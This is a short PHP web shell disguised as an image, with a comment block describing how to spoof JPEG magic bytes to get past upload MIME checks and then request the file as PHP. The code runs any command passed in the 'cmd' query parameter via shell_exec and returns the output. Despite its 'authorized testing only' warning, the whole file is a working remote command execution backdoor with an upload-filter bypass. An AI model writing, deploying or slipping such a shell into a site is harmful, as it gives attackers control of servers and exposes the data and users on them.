<?php
/*
* IMAGE HEADER BYPASS SHELL
* 
* ⚠️  SECURITY WARNING ⚠️
* This tool demonstrates file upload bypass techniques for AUTHORIZED testing ONLY
* - Only use on systems you own or have explicit permission to test
* - Unauthorized access is illegal and punishable by law
* - Remove immediately after testing
* 
* BYPASS INSTRUCTIONS:
* 1. Modify file header using hex editor to spoof JPEG magic bytes
* 2. Replace first four bytes with: FF D8 FF E0
* 3. This bypasses basic MIME type validation
* 4. Upload as .jpg, then access as .php if server processes it
* 
* Usage: shell.jpg.php?cmd=whoami
*/

// JPEG magic bytes for bypass (modify these in hex editor)
// ÿØÿà

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    error_log("Image shell command executed: " . $cmd);
    echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
} else {
    echo "Image shell ready. Usage: ?cmd=command_here";
}
?>
